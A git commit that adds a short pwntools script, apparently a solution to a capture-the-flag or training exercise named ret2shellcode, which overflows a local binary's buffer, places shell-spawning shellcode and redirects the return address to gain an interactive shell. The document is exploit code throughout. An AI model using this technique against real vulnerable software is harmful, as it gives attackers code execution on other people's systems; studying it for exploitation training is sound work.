d6628ce01c90012b896fd3c98171e1ea263d7b51
UCAS-FTC <18913805248@163.com>
2024-11-25 11:05:00 +0800

    Add files via upload

---
+++ ret2shellcode.py
@@ -0,0 +1,10 @@
+from pwn import *
+
+sh = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+offset = 0x6c+4
+shellcodepad = shellcode + (offset-len(shellcode))*b'A'
+
+sh.sendline(shellcodepad + p32(buf2_addr))
+sh.interactive()
